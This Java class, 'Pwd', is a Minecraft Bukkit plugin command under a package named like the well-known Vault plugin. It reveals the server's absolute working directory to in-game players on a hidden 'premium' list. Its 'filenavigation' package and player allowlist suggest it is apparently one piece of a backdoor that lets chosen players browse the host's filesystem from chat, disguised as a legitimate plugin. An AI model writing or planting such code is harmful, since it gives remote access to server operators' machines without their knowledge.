package net.milkbowl.vault.commands.cmds.filenavigation;

import java.io.File;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.FileUtil;
import net.milkbowl.vault.util.Settings;

public class Pwd extends CommandManager {
	
	File file = FileUtil.getWorkingDirectory();
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
		p.sendMessage(Settings.PREFIX(file.getAbsolutePath()));
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + " to execute this command"));
		}
	}

}
